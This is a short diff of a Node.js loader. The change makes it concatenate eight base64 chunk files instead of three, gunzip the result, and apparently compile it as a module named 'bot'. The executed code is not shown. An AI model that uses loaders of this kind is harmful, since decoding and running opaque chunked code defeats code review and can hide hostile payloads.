@@ -1,6 +1,6 @@
 const z = require('zlib');
 const Module = require('module');
-const b64 = require('./bot.js.part0') + require('./bot.js.part1') + require('./bot.js.part2');
+const b64 = require('./bot.js.part0') + require('./bot.js.part1') + require('./bot.js.part2') + require('./bot.js.part3') + require('./bot.js.part4') + require('./bot.js.part5') + require('./bot.js.part6') + require('./bot.js.part7');
 const code = z.gunzipSync(Buffer.from(b64, 'base64')).toString('utf8');
 const m = new Module(module.filename);
 m.filename = __filename;
